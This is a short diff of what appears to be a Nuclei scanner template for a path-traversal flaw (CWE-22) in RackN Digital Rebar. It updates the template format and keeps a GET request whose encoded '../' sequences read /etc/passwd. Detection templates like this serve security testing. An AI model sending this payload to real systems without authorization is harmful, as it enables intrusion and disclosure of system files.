@@ -13,8 +13,10 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: lfi,rackn,digitalrebar
+  metadata:
+    max-request: 1
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
